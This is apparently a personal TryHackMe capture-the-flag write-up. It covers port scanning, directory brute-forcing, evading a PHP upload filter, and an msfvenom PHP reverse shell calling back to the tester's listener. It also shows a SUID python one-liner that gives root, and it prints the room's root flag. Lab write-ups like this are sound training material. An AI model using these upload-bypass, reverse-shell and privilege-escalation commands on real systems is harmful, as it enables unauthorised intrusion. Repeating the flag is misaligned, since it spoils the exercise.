<mark style="background: #BBFABBA6;">Nmap</mark>

┌──(root💀kali)-[~/Desktop/THM]
└─# nmap  -sT -sV 10.10.218.129
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-04 16:13 IST
Nmap scan report for 10.10.218.129
Host is up (0.41s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.91 seconds




<mark style="background: #BBFABBA6;">HTTP</mark>


http://10.10.218.129


found nothing in robots.txt and source code


Found out website is running php usings wappalyzer


Tried brutte force using ffuf

──(root💀kali)-[~/Desktop/THM]
└─# ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.10.218.129/FUZZ  


Found some directories

uploads                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 408ms]
css                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 410ms]
js                      [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 410ms]
panel                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 408ms]


Found out we can uplaod a file on /panel directory


so i uploaded the PHP rev shell i have on my system but i some some text in other language so i google it.
Turnz out it was portuguese and after translation

it was "PHP is not allowed"

ok now i found a list of extension on the internet
https://gist.github.com/securifera/e7eed730cbe1ce43d0c29d7cd2d582f4

used burp to capture that packet and bruteforced the extention of the file to see what ext were accepted by the server


ok turns out almost all ext are accepted it was the browser that was blocking the php extension upload because in the brute force .php was also present

Now i started a netcat listener on port 9999


and opened the php file on http://10.10.218.129/uploads/


http://10.10.218.129/uploads/revshell.%252ephp


But i was getting an error. i tried searching on the inernet.

instead i went with msfvenom payload created and made a php reverse shell using msfvenom

┌──(root💀kali)-[~/Desktop/THM]
└─# msfvenom -p php/reverse_php LHOST:10.4.14.186 LPORT:9999 -f raw -o venom_revshell.php5

>had to change the ip and port again using mousepad because it was not update idk why


okay this time the brose was stuck in loading page and no connection on netcat


okay so i triead with different port nu,mber 1337 and i worked

so great, a little break of 2 min works


okay so issue still persisted 

<mark style="background: #FF5582A6;">when i used port 8080 and changed the filenmae to a.php it worked </mark>

Found the first flag in :






<mark style="background: #BBFABBA6;">Privilege Escalation</mark>


i followed the priv escalation notes and found all the systems with SUID bits sets using below commands


`find / -perm -u=s -type f 2>/dev/null`


Now here i didnt knew which files was supposed to be wierd so I tried them all in THM answers

i got python to be the correct one

/usr/bin/python


Now i went to 
https://gtfobins.github.io/gtfobins/python/

to check what commands to run to escalate priv for python SUID bit set

i ran the below command and I got root

>python -c 'import os; os.execl("/bin/sh", "sh", "-p")'


Now in the home directory of root i got the root flag


THM{pr1v1l3g3_3sc4l4t10n}


System completed



